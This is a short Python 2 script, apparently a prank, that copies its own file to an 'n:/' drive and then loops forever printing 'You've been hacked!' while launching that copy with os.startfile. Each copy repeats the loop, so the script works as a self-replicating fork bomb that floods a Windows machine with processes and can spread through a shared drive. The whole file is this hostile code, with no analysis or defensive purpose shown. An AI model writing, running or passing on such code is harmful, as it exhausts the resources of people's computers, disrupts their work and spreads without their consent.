'''
Created on 7 Dec 2015

@author: Harry
'''

import os
import shutil



directory = os.getcwd() + '\main.py'

shutil.copyfile(directory, 'n:/main.py')
while True:
    print "You've been hacked!"
    os.startfile('n:/main.py')
   
